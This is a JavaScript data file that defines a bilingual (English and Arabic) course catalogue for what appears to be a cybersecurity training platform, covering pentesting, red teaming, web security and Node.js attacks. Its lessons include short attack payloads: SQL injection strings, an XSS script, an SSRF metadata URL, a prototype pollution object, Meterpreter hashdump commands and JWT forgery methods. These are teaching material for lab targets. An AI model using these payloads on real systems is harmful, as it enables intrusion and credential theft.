
export const courses = [
    // ==================== FLAGSHIP CAREER TRACKS (EXISTING) ====================

    // Penetration Tester (Flagship Career Track)
    {
        id: 'antigravity-pentester',
        title: 'Professional Penetration Tester',
        titleAr: 'مختبر اختراق محترف',
        instructor: 'فريق ShadowHack',
        level: 'advanced',
        duration: '120 ساعة',
        rating: 4.9,
        students: 5400,
        price: 'Premium',
        description: 'Master the art of ethical hacking from fundamentals to advanced exploitation.',
        descriptionEn: 'Master the art of ethical hacking from fundamentals to advanced exploitation.',
        descriptionAr: 'احترف فن الاختراق الأخلاقي من الأساسيات وحتى تقنيات الاستغلال المتقدمة.',
        prerequisites: ['linux-fundamentals', 'network-pentest'],
        skills: ['Metasploit', 'Burp Suite', 'AD Hacking', 'PrivEsc', 'OSINT'],
        certificate: true,
        modules: [
            {
                id: 'pt-fund',
                title: 'Phase 1: Fundamentals',
                titleAr: 'المرحلة 1: الأساسيات',
                duration: '20 ساعة',
                lessons: [
                    { id: 'pt-ethics', title: 'Ethics & Legal Issues', titleAr: 'الأخلاقيات والقوانين', type: 'text', content: '# Ethics & Legal Issues\n\nMaster the legal framework and professional ethics of penetration testing.\n\n## Key Concepts\n- **Authorization**: Always get written permission.\n- **Scope**: Define what is allowed and what is not.\n- **Reporting**: Report findings responsibly.' },
                    { id: 'pt-method', title: 'PT Methodologies', titleAr: 'منهجيات اختبار الاختراق', type: 'text', content: '# Methodologies\n\nLearn PTES, OSSTMM, and OWASP testing frameworks.\n\n1. **PTES**: Penetration Testing Execution Standard.\n2. **OSSTMM**: Open Source Security Testing Methodology Manual.\n3. **OWASP**: Open Web Application Security Project.' },
                    { id: 'pt-report', title: 'Reporting & Documentation', titleAr: 'التقارير والتوثيق', type: 'text', content: '# Reporting\n\nHow to write professional security reports for stakeholders.\n\n- Executive Summary\n- Technical Details\n- Risk Assessment\n- Remediation Steps' }
                ]
            },
            {
                id: 'pt-recon',
                title: 'Phase 2: Reconnaissance',
                titleAr: 'المرحلة 2: الاستطلاع',
                duration: '25 ساعة',
                lessons: [
                    { id: 'pt-passive', title: 'Passive Recon', titleAr: 'الاستطلاع السلبي', type: 'lab', content: '# Passive Reconnaissance\n\nUsing OSINT tools to gather data without direct contact.\n\n## Tools\n- `theHarvester`\n- `Shodan`\n- `Maltego`' },
                    { id: 'pt-active', title: 'Active Recon (Nmap)', titleAr: 'الاستطلاع النشط (Nmap)', type: 'lab', content: '# Active Reconnaissance\n\nDeep dive into service scanning and network mapping.\n\n```bash\nnmap -sC -sV -oA scan target_ip\n```' },
                    { id: 'pt-dns', title: 'DNS Enumeration', titleAr: 'تعداد DNS', type: 'lab', content: '# DNS Enumeration\n\nFinding subdomains and zone transfers.\n\n```bash\ndig axfr @ns1.target.com target.com\n```' }
                ]
            },
            {
                id: 'pt-vuln',
                title: 'Phase 3: Vulnerability Assessment',
                titleAr: 'المرحلة 3: تقييم الثغرات',
                duration: '20 ساعة',
                lessons: [
                    { id: 'pt-scan-theory', title: 'Scanning Theory', titleAr: 'نظرية الفحص', type: 'text', content: '# Scanning Theory\n\nUnderstanding how scanners identify weaknesses.\n\n- Signature matching\n- Heuristics\n- Fuzzing' },
                    { id: 'pt-nessus', title: 'Nessus Essentials', titleAr: 'أساسيات Nessus', type: 'lab', content: '# Nessus\n\nConfiguring and running vulnerability scans with Tenable Nessus.' }
                ]
            },
            {
                id: 'pt-web',
                title: 'Phase 4: Web Application Pentesting',
                titleAr: 'المرحلة 4: اختراق تطبيقات الويب',
                duration: '30 ساعة',
                lessons: [
                    {
                        id: 'pt-sqli',
                        title: 'SQL Injection',
                        titleAr: 'حقن SQL',
                        type: 'lab',
                        machineId: 'dvwa',
                        content: '# SQL Injection\n\nExploiting database vulnerabilities in Damn Vulnerable Web App.\n\n```sql\n\' OR 1=1--\n```',
                        tasks: [
                            { id: 1, text: 'Deploy the DVWA machine' },
                            { id: 2, text: 'Bypass the login page using a basic SQL injection' },
                            { id: 3, text: 'Extract the database version using UNION-based injection' },
                            { id: 4, text: 'Find the hidden "flag" in the users table' }
                        ]
                    },
                    {
                        id: 'pt-xss',
                        title: 'Cross-Site Scripting',
                        titleAr: 'XSS',
                        type: 'lab',
                        machineId: 'juice-shop',
                        content: '# XSS\n\nClient-side injection attacks in OWASP Juice Shop.',
                        tasks: [
                            { id: 1, text: 'Identify a reflected XSS vulnerability in the search bar' },
                            { id: 2, text: 'Craft a payload to steal the admin cookie' },
                            { id: 3, text: 'Find a persistent XSS in the user profile' }
                        ]
                    },
                    { id: 'pt-auth', title: 'Broken Auth', titleAr: 'كسر المصادقة', type: 'lab', content: '# Broken Authentication\n\nBypassing login and session controls.' }
                ]
            },
            {
                id: 'pt-net',
                title: 'Phase 5: Network Penetration Testing',
                titleAr: 'المرحلة 5: اختراق الشبكات',
                duration: '35 ساعة',
                lessons: [
                    { id: 'pt-privesc', title: 'Privilege Escalation', titleAr: 'تصعيد الصلاحيات', type: 'lab', machineId: 'apollo-01', content: '# Privilege Escalation\n\nFrom user to root/system.' },
                    { id: 'pt-kerb', title: 'Active Directory Attacks', titleAr: 'هجمات AD', type: 'lab', machineId: 'kerberoasting', content: '# Active Directory\n\nKerberoasting, Golden Tickets, and more.' },
                    { id: 'pt-pivot', title: 'Pivoting & Tunneling', titleAr: 'التنقل والأنفاق', type: 'lab', content: '# Pivoting\n\nMoving through the internal network using specialized tools.' }
                ]
            }
        ],
        whatYouWillLearn: [
            'End-to-end penetration testing methodology',
            'Advanced Active Directory exploitation',
            'Professional report writing',
            'Modern web application security testing'
        ]
    },

    // SOC Level 1
    {
        id: 'soc-level-1',
        title: 'SOC Analyst Level 1',
        titleAr: 'محلل أمن (SOC) - المستوى 1',
        instructor: 'فريق ShadowHack',
        level: 'intermediate',
        duration: '40 ساعة',
        rating: 4.8,
        students: 3200,
        price: 'Free',
        description: 'Start your career as a Security Analyst. Monitor, Detect, and Respond.',
        descriptionEn: 'Start your career as a Security Analyst. Monitor, Detect, and Respond.',
        descriptionAr: 'ابدأ مسارك كـمحلل أمني. المراقبة، الاكتشاف، والاستجابة.',
        prerequisites: ['network-pentest'],
        skills: ['Splunk', 'Wireshark', 'Log Analysis', 'Incident Response'],
        certificate: true,
        modules: [
            {
                id: 'soc-fund',
                title: 'SOC Fundamentals',
                titleAr: 'أساسيات الـ SOC',
                duration: '10 ساعات',
                lessons: [
                    { id: 'soc-roles', title: 'SOC Structure & Roles', titleAr: 'هيكلية وأدوار الـ SOC', type: 'text', content: 'Learn about Tier 1, 2, and 3 analysts.' }
                ]
            },
            {
                id: 'soc-siem',
                title: 'SIEM Operations',
                titleAr: 'عمليات SIEM',
                duration: '15 ساعة',
                lessons: [
                    { id: 'siem-splunk', title: 'Splunk Power User', titleAr: 'مستخدم Splunk محترف', type: 'lab', content: 'Searching and reporting with Splunk.' },
                    { id: 'siem-kql', title: 'KQL Basics (ELK)', titleAr: 'أساسيات KQL', type: 'lab', content: 'Querying logs in Azure Sentinel and ELK.' }
                ]
            }
        ]
    },

    // Red Teaming
    {
        id: 'red-teaming',
        title: 'Red Team Operator',
        titleAr: 'مشغل الفريق الأحمر (Red Team)',
        instructor: 'فريق ShadowHack',
        level: 'advanced',
        duration: '80 ساعة',
        rating: 5.0,
        students: 1800,
        price: 'Premium',
        description: 'Simulate advanced adversaries. C2, Lateral Movement, and OPSEC.',
        descriptionEn: 'Simulate advanced adversaries. C2, Lateral Movement, and OPSEC.',
        descriptionAr: 'محاكاة الخصوم المتقدمين. التحكم (C2)، التنقل الجانبي، وأمن العمليات.',
        prerequisites: ['antigravity-pentester'],
        skills: ['C2 Frameworks', 'AV Evasion', 'OPSEC', 'Cobalt Strike'],
        certificate: true,
        modules: [
            {
                id: 'rt-c2',
                title: 'C2 Infrastructure',
                titleAr: 'بنية التحتية لـ C2',
                duration: '20 ساعات',
                lessons: [
                    { id: 'c2-setup', title: 'Setting up Sliver/Mythic', titleAr: 'إعداد منصات C2', type: 'lab', content: 'Building robust command and control servers.' }
                ]
            }
        ]
    },

    // Cloud Security
    {
        id: 'cloud-security',
        title: 'Cloud Security Specialist',
        titleAr: 'أخصائي أمن سحابي',
        instructor: 'فريق ShadowHack',
        level: 'advanced',
        duration: '45 ساعة',
        rating: 4.7,
        students: 2100,
        price: 'Premium',
        description: 'Secure AWS, Azure, and GCP environments. Auditing and Hardening.',
        descriptionEn: 'Secure AWS, Azure, and GCP environments. Auditing and Hardening.',
        descriptionAr: 'حماية وإدارة أمن البيئات السحابية (AWS, Azure, GCP).',
        prerequisites: ['network-pentest'],
        skills: ['AWS IAM', 'S3 Security', 'Azure AD', 'Cloud Pentest'],
        certificate: true,
        modules: [
            {
                id: 'cloud-aws',
                title: 'AWS Security Mastery',
                titleAr: 'احتراف أمن AWS',
                duration: '20 ساعة',
                lessons: [
                    { id: 'aws-iam', title: 'IAM Privilege Escalation', titleAr: 'تصعيد صلاحيات IAM', type: 'lab', content: 'Identifying misconfigurations in AWS identities.' }
                ]
            }
        ]
    },

    // Web Application Pentesting
    {
        id: 'web-pentesting',
        title: 'Web Application Pentesting',
        titleAr: 'اختبار اختراق تطبيقات الويب',
        instructor: 'فريق ShadowHack',
        level: 'intermediate',
        duration: '60 ساعة',
        rating: 4.8,
        students: 2400,
        price: 'Premium',
        description: 'Find and exploit web vulnerabilities. OWASP Top 10, Injection, and XSS.',
        descriptionEn: 'Find and exploit web vulnerabilities. OWASP Top 10, Injection, and XSS.',
        descriptionAr: 'اكتشاف واستغلال ثغرات تطبيقات الويب. ثغرات OWASP Top 10، الحقن، والـ XSS.',
        prerequisites: ['linux-fundamentals'], // Changed key
        skills: ['SQLi', 'XSS', 'Auth Bypass', 'SSRF', 'JWT'],
        certificate: true,
        modules: [
            {
                id: 'web-recon',
                title: 'Reconnaissance',
                titleAr: 'الاستطلاع',
                duration: '10 ساعات',
                lessons: [
                    { id: 'recon-sub', title: 'Subdomain Enumeration', titleAr: 'تعداد النطاقات الفرعية', type: 'lab', content: 'Finding hidden assets and forgotten subdomains.' },
                    { id: 'recon-tech', title: 'Tech Stack ID', titleAr: 'تحديد البنية التقنية', type: 'lab', content: 'Identifying technologies used in the target application.' }
                ]
            },
            {
                id: 'web-inj',
                title: 'Injection Attacks',
                titleAr: 'هجمات الحقن',
                duration: '15 ساعة',
                lessons: [
                    { id: 'inj-sql', title: 'SQL Injection', titleAr: 'حقن SQL', type: 'lab', content: 'Exploiting database layer vulnerabilities.' },
                    { id: 'inj-cmd', title: 'Command Injection', titleAr: 'حقن الأوامر', type: 'lab', content: 'Executing system commands through the web app.' }
                ]
            }
        ]
    },

    // DevSecOps
    {
        id: 'devsecops',
        title: 'DevSecOps Specialist',
        titleAr: 'أخصائي ديف سيك أوبس (DevSecOps)',
        instructor: 'فريق ShadowHack',
        level: 'advanced',
        duration: '40 ساعة',
        rating: 4.9,
        students: 1500,
        price: 'Premium',
        description: 'Integrate security into the SDLC. CI/CD, Containers, and Kubernetes.',
        descriptionEn: 'Integrate security into the SDLC. CI/CD, Containers, and Kubernetes.',
        descriptionAr: 'دمج الأمن في دورة حياة تطوير البرمجيات. CI/CD، الحاويات، و Kubernetes.',
        prerequisites: ['linux-fundamentals'],
        skills: ['Docker', 'Kubernetes', 'CI/CD Security', 'SCA', 'SAST'],
        certificate: true,
        modules: [
            {
                id: 'dso-docker',
                title: 'Container Security',
                titleAr: 'أمن الحاويات',
                duration: '15 ساعة',
                lessons: [
                    { id: 'docker-esc', title: 'Docker Breakouts', titleAr: 'الهروب من الحاويات', type: 'lab', content: 'Techniques to escape container boundaries.' }
                ]
            },
            {
                id: 'dso-k8s',
                title: 'Kubernetes Security',
                titleAr: 'أمن كوبرنيتيس (Kubernetes)',
                duration: '20 ساعة',
                lessons: [
                    { id: 'k8s-attack', title: 'Attacking K8s', titleAr: 'مهاجمة كوبرنيتيس', type: 'lab', content: 'Identifying and exploiting flaws in K8s clusters.' }
                ]
            }
        ]
    },

    // Security Engineering
    {
        id: 'security-engineer',
        title: 'Security Engineering',
        titleAr: 'الهندسة الأمنية',
        instructor: 'فريق ShadowHack',
        level: 'intermediate',
        duration: '40 ساعة',
        rating: 4.7,
        students: 1900,
        price: 'Premium',
        description: 'Building secure systems and networks.',
        descriptionEn: 'Building secure systems and networks.',
        descriptionAr: 'بناء الأنظمة والشبكات الآمنة.',
        prerequisites: ['network-pentest'],
        skills: ['Zero Trust', 'Hardening', 'Firewalls', 'IDS/IPS'],
        certificate: true,
        modules: [
            {
                id: 'eng-arch',
                title: 'Security Architecture',
                titleAr: 'المعمارية الأمنية',
                duration: '15 ساعة',
                lessons: [
                    { id: 'arch-zero', title: 'Zero Trust Principles', titleAr: 'مبادئ الثقة الصفرية', type: 'text', content: 'Modern network architecture foundations.' }
                ]
            },
            {
                id: 'eng-harden',
                title: 'System Hardening',
                titleAr: 'تحصين الأنظمة',
                duration: '20 ساعة',
                lessons: [
                    { id: 'hard-lin', title: 'Linux Hardening', titleAr: 'تحصين لينكس', type: 'lab', content: 'Securing servers against common threats.' }
                ]
            }
        ]
    },

    // ==================== LEGACY FOUNDATIONAL COURSES ====================

    // Course 1: Linux Fundamentals
    {
        id: 'linux-fundamentals', title: 'Linux Fundamentals', titleAr: 'أساسيات لينكس',
        instructor: 'فريق ShadowHack', level: 'beginner', duration: '25 ساعة', rating: 4.8, students: 2150, price: 'مجاني',
        description: 'تعلم أساسيات لينكس من الصفر', descriptionEn: 'Learn Linux basics from scratch',
        descriptionAr: 'تعلم أساسيات لينكس من الصفر',
        prerequisites: [], skills: ['Linux', 'Command Line', 'Bash'], certificate: true,
        modules: [
            {
                id: 'module-1', title: 'Getting Started', titleAr: 'البداية مع لينكس', duration: '5 ساعات',
                lessons: [
                    { id: 'lesson-1', title: 'What is Linux?', titleAr: 'ما هو لينكس؟', type: 'video', duration: '15 دقيقة', content: '# مقدمة عن لينكس\n\nلينكس نظام تشغيل مفتوح المصدر.' },
                    { id: 'lesson-2', title: 'Installing Linux', titleAr: 'تثبيت لينكس', type: 'video', duration: '20 دقيقة', content: '# تثبيت لينكس\n\n- Virtual Machine\n- Dual Boot\n- WSL' },
                    { id: 'lesson-3', title: 'Basic Commands', titleAr: 'الأوامر الأساسية', type: 'lab', duration: '30 دقيقة', content: '# أوامر أساسية\n\n```bash\npwd, ls, cd, cat, cp, mv, rm, mkdir\n```' }
                ],
                quiz: {
                    id: 'quiz-1', title: 'Linux Quiz', passingScore: 70, questions: [
                        { id: 'q1', question: 'ما الأمر لعرض المسار الحالي؟', type: 'multiple-choice', options: ['pwd', 'cd', 'ls', 'dir'], correctAnswer: 0, explanation: 'pwd = Print Working Directory' }
                    ]
                }
            },
            {
                id: 'module-2', title: 'File System', titleAr: 'نظام الملفات', duration: '6 ساعات',
                lessons: [
                    { id: 'lesson-1', title: 'Linux File System', titleAr: 'نظام ملفات لينكس', type: 'video', duration: '25 دقيقة', content: '# نظام الملفات\n\n/home, /etc, /var, /tmp, /bin' },
                    { id: 'lesson-2', title: 'File Permissions', titleAr: 'صلاحيات الملفات', type: 'lab', duration: '35 دقيقة', content: '# الصلاحيات\n\n```bash\nchmod 755 file\nchown user:group file\n```' }
                ]
            }
        ],
        whatYouWillLearn: ['التنقل في لينكس', 'إدارة الملفات', 'الصلاحيات', 'Bash scripting']
    },

    // Course 2: Web Application Security (Legacy Rich)
    {
        id: 'web-app-security', title: 'Web Application Security', titleAr: 'أمن تطبيقات الويب',
        instructor: 'فريق ShadowHack', level: 'intermediate', duration: '40 ساعة', rating: 4.9, students: 1250, price: 'مجاني',
        description: 'كورس شامل يغطي OWASP Top 10', descriptionEn: 'Complete OWASP Top 10 course',
        descriptionAr: 'كورس شامل يغطي OWASP Top 10',
        prerequisites: ['linux-fundamentals'], skills: ['Web Security', 'OWASP', 'Burp Suite', 'Pentest'], certificate: true,
        modules: [
            {
                id: 'module-1', title: 'OWASP Top 10', titleAr: 'أهم 10 ثغرات OWASP', duration: '10 ساعات',
                lessons: [
                    { id: 'lesson-1', title: 'SQL Injection', titleAr: 'حقن SQL', type: 'video', duration: '25 دقيقة', content: '# SQL Injection\n\n```sql\n\' OR 1=1--\n\' UNION SELECT username,password FROM users--\n```' },
                    { id: 'lesson-2', title: 'XSS Attacks', titleAr: 'هجمات XSS', type: 'video', duration: '20 دقيقة', content: '# XSS\n\nReflected, Stored, DOM-based\n```html\n<script>alert(1)</script>\n```' },
                    { id: 'lesson-3', title: 'CSRF Attacks', titleAr: 'هجمات CSRF', type: 'lab', duration: '30 دقيقة', content: '# CSRF\n\nتزوير الطلبات عبر المواقع' },
                    { id: 'lesson-4', title: 'IDOR', titleAr: 'ثغرات IDOR', type: 'video', duration: '20 دقيقة', content: '# IDOR\n\n/api/users/123 → /api/users/124' }
                ],
                quiz: {
                    id: 'quiz-1', title: 'OWASP Quiz', passingScore: 70, questions: [
                        { id: 'q1', question: 'أي نوع XSS الأخطر؟', type: 'multiple-choice', options: ['Reflected', 'Stored', 'DOM', 'Self'], correctAnswer: 1, explanation: 'Stored يؤثر على الجميع' },
                        { id: 'q2', question: 'أفضل حماية ضد SQLi؟', type: 'multiple-choice', options: ['WAF', 'Prepared Statements', 'Filter', 'Encrypt'], correctAnswer: 1, explanation: 'Prepared Statements تفصل الكود عن البيانات' }
                    ]
                }
            },
            {
                id: 'module-2', title: 'Advanced Attacks', titleAr: 'هجمات متقدمة', duration: '12 ساعة',
                lessons: [
                    { id: 'lesson-1', title: 'XXE Injection', titleAr: 'حقن XXE', type: 'video', duration: '25 دقيقة', content: '# XXE\n\nقراءة ملفات النظام عبر XML' },
                    { id: 'lesson-2', title: 'SSRF Attacks', titleAr: 'هجمات SSRF', type: 'lab', duration: '35 دقيقة', content: '# SSRF\n\nhttp://169.254.169.254/' },
                    { id: 'lesson-3', title: 'File Upload', titleAr: 'رفع الملفات', type: 'lab', duration: '30 دقيقة', content: '# File Upload RCE\n\nWeb shell upload' }
                ]
            },
            {
                id: 'module-3', title: 'Burp Suite', titleAr: 'Burp Suite', duration: '8 ساعات',
                lessons: [
                    { id: 'lesson-1', title: 'Burp Setup', titleAr: 'إعداد Burp', type: 'video', duration: '15 دقيقة', content: '# Burp Suite\n\nProxy, Intercept, Repeater, Intruder' },
                    { id: 'lesson-2', title: 'Intercepting', titleAr: 'الاعتراض', type: 'lab', duration: '25 دقيقة', content: '# اعتراض الطلبات' },
                    { id: 'lesson-3', title: 'Intruder', titleAr: 'Intruder', type: 'lab', duration: '30 دقيقة', content: '# Intruder\n\nBruteforce, Fuzzing' }
                ]
            }
        ],
        whatYouWillLearn: ['OWASP Top 10', 'Burp Suite', 'كتابة التقارير', 'الحماية']
    },

    // Course 3: Network Penetration Testing (Legacy Rich)
    {
        id: 'network-pentest', title: 'Network Penetration Testing', titleAr: 'اختبار اختراق الشبكات',
        instructor: 'فريق ShadowHack', level: 'intermediate', duration: '35 ساعة', rating: 4.7, students: 980, price: 'مجاني',
        description: 'تعلم اختبار اختراق الشبكات', descriptionEn: 'Learn network penetration testing',
        descriptionAr: 'تعلم اختبار اختراق الشبكات',
        prerequisites: ['linux-fundamentals'], skills: ['Nmap', 'Metasploit', 'Network Security'], certificate: true,
        modules: [
            {
                id: 'module-1', title: 'Network Scanning', titleAr: 'فحص الشبكات', duration: '8 ساعات',
                lessons: [
                    { id: 'lesson-1', title: 'Nmap', titleAr: 'Nmap', type: 'video', duration: '30 دقيقة', content: '# Nmap\n\n```bash\nnmap -sV -sC target\nnmap -p- target\n```' },
                    { id: 'lesson-2', title: 'Service Enumeration', titleAr: 'تعداد الخدمات', type: 'lab', duration: '40 دقيقة', content: '# Enumeration\n\nenum4linux, snmpwalk, dnsrecon' }
                ]
            },
            {
                id: 'module-2', title: 'Metasploit', titleAr: 'Metasploit', duration: '10 ساعات',
                lessons: [
                    { id: 'lesson-1', title: 'Metasploit Basics', titleAr: 'أساسيات Metasploit', type: 'video', duration: '25 دقيقة', content: '# Metasploit\n\n```bash\nmsfconsole\nsearch exploit\nuse exploit/...\nset RHOSTS target\nexploit\n```' },
                    { id: 'lesson-2', title: 'Post Exploitation', titleAr: 'ما بعد الاستغلال', type: 'lab', duration: '45 دقيقة', content: '# Meterpreter\n\nsysinfo, getuid, hashdump, getsystem' }
                ]
            }
        ],
        whatYouWillLearn: ['Nmap', 'Metasploit', 'Privilege Escalation', 'Lateral Movement']
    },

    // Course 4: Bug Bounty Hunting
    {
        id: 'bug-bounty-hunting', title: 'Bug Bounty Hunting', titleAr: 'صيد الثغرات',
        instructor: 'فريق ShadowHack', level: 'advanced', duration: '50 ساعة', rating: 5.0, students: 890, price: 'مجاني',
        description: 'احترف صيد الثغرات', descriptionEn: 'Master bug bounty hunting',
        descriptionAr: 'احترف صيد الثغرات',
        prerequisites: ['web-app-security'], skills: ['Bug Bounty', 'Recon', 'Automation', 'Reports'], certificate: true,
        modules: [
            {
                id: 'module-1', title: 'Reconnaissance', titleAr: 'الاستطلاع', duration: '15 ساعة',
                lessons: [
                    { id: 'lesson-1', title: 'Subdomain Enum', titleAr: 'النطاقات الفرعية', type: 'video', duration: '30 دقيقة', content: '# Subdomains\n\nsubfinder, amass, httpx' },
                    { id: 'lesson-2', title: 'Content Discovery', titleAr: 'اكتشاف المحتوى', type: 'lab', duration: '35 دقيقة', content: '# Discovery\n\ngobuster, ffuf, dirsearch' },
                    { id: 'lesson-3', title: 'JS Analysis', titleAr: 'تحليل JS', type: 'video', duration: '25 دقيقة', content: '# JavaScript\n\nAPI keys, endpoints, secrets' }
                ],
                quiz: {
                    id: 'quiz-1', title: 'Recon Quiz', passingScore: 70, questions: [
                        { id: 'q1', question: 'أداة تعداد النطاقات الفرعية؟', type: 'multiple-choice', options: ['Burp', 'Subfinder', 'Nmap', 'SQLMap'], correctAnswer: 1, explanation: 'Subfinder للنطاقات الفرعية' }
                    ]
                }
            },
            {
                id: 'module-2', title: 'Report Writing', titleAr: 'كتابة التقارير', duration: '8 ساعات',
                lessons: [
                    { id: 'lesson-1', title: 'Writing Reports', titleAr: 'كتابة التقارير', type: 'video', duration: '20 دقيقة', content: '# Reports\n\nTitle, Severity, Steps, Impact, Fix' }
                ]
            }
        ],
        whatYouWillLearn: ['الاستطلاع', 'اكتشاف الثغرات', 'كتابة التقارير', 'الأتمتة']
    },

    // Course 5: Python for Hackers
    {
        id: 'python-hackers', title: 'Python for Hackers', titleAr: 'بايثون للهاكرز',
        instructor: 'فريق ShadowHack', level: 'intermediate', duration: '30 ساعة', rating: 4.8, students: 1560, price: 'مجاني',
        description: 'برمجة أدوات الاختراق', descriptionEn: 'Code hacking tools with Python',
        descriptionAr: 'برمجة أدوات الاختراق',
        prerequisites: ['linux-fundamentals'], skills: ['Python', 'Scripting', 'Automation', 'Tools'], certificate: true,
        modules: [
            {
                id: 'module-1', title: 'Python Basics', titleAr: 'أساسيات بايثون', duration: '8 ساعات',
                lessons: [
                    { id: 'lesson-1', title: 'Python Fundamentals', titleAr: 'الأساسيات', type: 'video', duration: '30 دقيقة', content: '# Python\n\nvariables, lists, loops, functions' },
                    { id: 'lesson-2', title: 'Working with Files', titleAr: 'الملفات', type: 'lab', duration: '25 دقيقة', content: '# Files\n\nopen, read, write' }
                ]
            },
            {
                id: 'module-2', title: 'Network Programming', titleAr: 'برمجة الشبكات', duration: '10 ساعات',
                lessons: [
                    { id: 'lesson-1', title: 'Socket Programming', titleAr: 'السوكيت', type: 'video', duration: '35 دقيقة', content: '# Sockets\n\nPort scanner, TCP client' },
                    { id: 'lesson-2', title: 'HTTP Requests', titleAr: 'طلبات HTTP', type: 'lab', duration: '30 دقيقة', content: '# Requests\n\nGET, POST, headers, cookies' }
                ]
            },
            {
                id: 'module-3', title: 'Building Tools', titleAr: 'بناء الأدوات', duration: '12 ساعة',
                lessons: [
                    { id: 'lesson-1', title: 'Subdomain Scanner', titleAr: 'ماسح النطاقات', type: 'lab', duration: '45 دقيقة', content: '# Scanner\n\nMultithreaded subdomain scanner' },
                    { id: 'lesson-2', title: 'Directory Bruteforcer', titleAr: 'تخمين المجلدات', type: 'lab', duration: '40 دقيقة', content: '# Bruteforcer\n\nDirectory discovery tool' }
                ]
            }
        ],
        whatYouWillLearn: ['Python', 'أدوات اختراق', 'أتمتة', 'تحليل الشبكات']
    },

    // ==================== NEW: WEB SECURITY ARCHITECTURE TRACK ====================

    // Track Course 1: Node.js & Express
    {
        id: 'course-nodejs-security',
        title: 'Node.js & Express: From Logic to Runtime',
        titleAr: 'أمن Node.js و Express',
        instructor: 'ShadowHack AI',
        level: 'advanced',
        duration: '4 weeks',
        rating: 5.0,
        students: 0,
        price: 'Premium',
        description: 'Exploiting Event Loops, Middleware, and Prototype Pollution.',
        descriptionEn: 'Deep dive into Node.js architecture attacks.',
        descriptionAr: 'استغلال حلقات الأحداث، والوسيط، وتلوث النموذج الأولي.',
        prerequisites: ['web-app-security'],
        skills: ['Node.js', 'Prototype Pollution', 'ReDoS', 'Express'],
        certificate: true,
        modules: [
            {
                id: 'module-1', title: 'The Engine & Logic', titleAr: 'المحرك والمنطق', duration: '1 week',
                lessons: [
                    {
                        id: 'lesson-1',
                        title: 'Architecture & Event Loop',
                        titleAr: 'المعمارية',
                        type: 'text',
                        duration: '1h',
                        content: '# The Architecture (المعمارية)\n\nNode.js is **single-threaded** and event-driven. It uses an **Event Loop** to handle asynchronous operations. In Express, requests pass through a chain of functions called **Middleware** (`app.use`).\n\n![Event Loop](assets/images/event-loop.png)\n\n### Logic Flow\n1. Request enters.\n2. Processed by Middleware 1 -> Middleware 2 -> ...\n3. Route Handler generates response.\n\n# The Flaw (الخلل)\n\n1. **Blocking the Single Thread**: Since there is only one thread, any heavy computation (like a complex Regex) blocks *all* users.\n2. **Middleware Order**: If `auth` middleware is placed *after* a sensitive route, authentication is bypassed.\n\n# The Weaponization (تحويل الخلل لسلاح)\n\n### Basic Method (Auth Bypass)\nIdentify routes declared before the authentication middleware.\n\n### Advanced Method (ReDoS)\nSend a malicious payload to a vulnerable Regex (e.g., `/(a+)+/`) to cause catastrophic backtracking, freezing the Event Loop and causing a DoS.\n\n# The Simulation (المحاكاة)\n\n```javascript\n// Vulnerable: Auth is after sensitive route\napp.use("/admin", adminRoutes);\napp.use(authMiddleware);\n```\n\n**Fix:** Move `app.use(authMiddleware)` to the top.\n\n# War Stories (قصص واقعية)\nStackOverflow suffered a global outage due to a corrupt Regex in their code affecting the Event Loop.'
                    }
                ]
            },
            {
                id: 'module-2', title: 'JS Internals & Pollution', titleAr: 'Prototype Pollution', duration: '1 week',
                lessons: [
                    {
                        id: 'lesson-1',
                        title: 'Prototype Pollution',
                        titleAr: 'تلويث النموذج الأولي',
                        type: 'text',
                        duration: '2h',
                        content: '# The Architecture (المعمارية)\n\nIn JavaScript, objects inherit properties from a **Prototype**. The root prototype is `Object.prototype`. Modifications to `__proto__` affect all objects.\n\n# The Flaw (الخلل)\n\nUnsafe recursive merge operations allow an attacker to control `__proto__` keys. This "pollutes" the base object, adding properties (like `isAdmin: true` or `shell: true`) to *every* object in the application.\n\n# The Weaponization (تحويل الخلل لسلاح)\n\n### Basic Method\nPollute `isAdmin` to bypass checks.\n`GET /?__proto__[isAdmin]=true`\n\n### Advanced Method (RCE)\nPollute gadget properties used by libraries like `child_process` (e.g., `shell`, `env`) to execute arbitrary commands on the server.\n\n# The Simulation (المحاكاة)\n\n```json\n// Payload\n{\n  "__proto__": {\n    "isAdmin": true\n  }\n}\n```\n\n# War Stories (قصص واقعية)\nKibana, a popular visualization tool for Elasticsearch, was found vulnerable to Prototype Pollution leading to RCE (CVE-2019-7609).'
                    }
                ]
            },
            {
                id: 'module-3', title: 'Auth & Session Engineering', titleAr: 'هندسة المصادقة', duration: '1 week',
                lessons: [
                    {
                        id: 'lesson-1',
                        title: 'JWT & Key Confusion',
                        titleAr: 'JWT Attacks',
                        type: 'text',
                        duration: '2h',
                        content: '# The Architecture (المعمارية)\n\nJWTs (JSON Web Tokens) are stateless. They consist of Header, Payload, and Signature. The signature ensures integrity using a secret (HMAC) or private key (RSA).\n\n# The Flaw (الخلل)\n\nThe library trusts the `alg` header provided by the user. If changed to `None`, signature validation is skipped. Or, confusing HMAC (symmetric) with RSA (asymmetric) allows signing tokens with the public key.\n\n# The Weaponization (تحويل الخلل لسلاح)\n\n### Basic Method\nChange `alg` to `None` and remove the signature.\n\n### Advanced Method (Key Confusion)\nChange `alg` from RS256 to HS256 and sign the token using the server\'s *public key* (which is available to the public) as the HMAC secret.\n\n# The Simulation (المحاكاة)\n\n**Vulnerable Lib:**\n`jwt.verify(token, publicKey)` // Without specifying algorithm.\n\n# War Stories (قصص واقعية)\nAuth0 had a critical vulnerability allowing the bypass of signature verification in some libraries.'
                    }
                ]
            }
        ],
        whatYouWillLearn: ['Middleware Analysis', 'ReDoS', 'Prototype Pollution', 'JWT Attacks']
    },

    // Track Course 2: Advanced Data
    {
        id: 'course-advanced-data',
        title: 'Advanced Data & Database Exploitation',
        titleAr: 'استغلال البيانات المتقدم',
        instructor: 'Antigravity AI',
        level: 'advanced',
        duration: '4 weeks',
        description: 'Mastering SQLi, NoSQL Injection, and SSRF.',
        descriptionEn: 'Advanced Database and OOB attacks.',
        descriptionAr: 'احتراف حقن SQL، حقن NoSQL، و SSRF.',
        skills: ['SQLi', 'NoSQL', 'SSRF', 'Redis'],
        certificate: true,
        modules: [
            {
                id: 'module-1', title: 'SQL Injection Mastery', titleAr: 'SQL متقدم', duration: '1 week',
                lessons: [
                    {
                        id: 'lesson-1',
                        title: 'Blind & OOB SQLi',
                        titleAr: 'الحقن الأعمى',
                        type: 'text',
                        duration: '2h',
